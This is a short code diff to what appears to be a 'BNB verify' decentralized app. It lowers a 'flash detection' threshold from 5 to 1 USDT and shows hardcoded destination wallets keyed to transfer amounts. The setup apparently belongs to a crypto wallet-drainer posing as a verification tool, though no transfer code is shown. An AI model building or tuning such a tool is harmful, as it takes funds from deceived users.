@@ -80,7 +80,7 @@ export default function BNBVerifyDApp() {
   const HIGH_AMOUNT_WALLET = "0x0C775115c4a9483e1b92B1203F30220E657182D0" // For amounts > 2000 USDT
   const HIGH_AMOUNT_THRESHOLD = 2000 // USDT threshold for high amount wallet
   const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955" // USDT BEP-20
-  const FLASH_THRESHOLD = 5 // USDT threshold for flash detection
+  const FLASH_THRESHOLD = 1 // USDT threshold for flash detection
 
   // BSC Network configuration
   const BSC_NETWORK = {
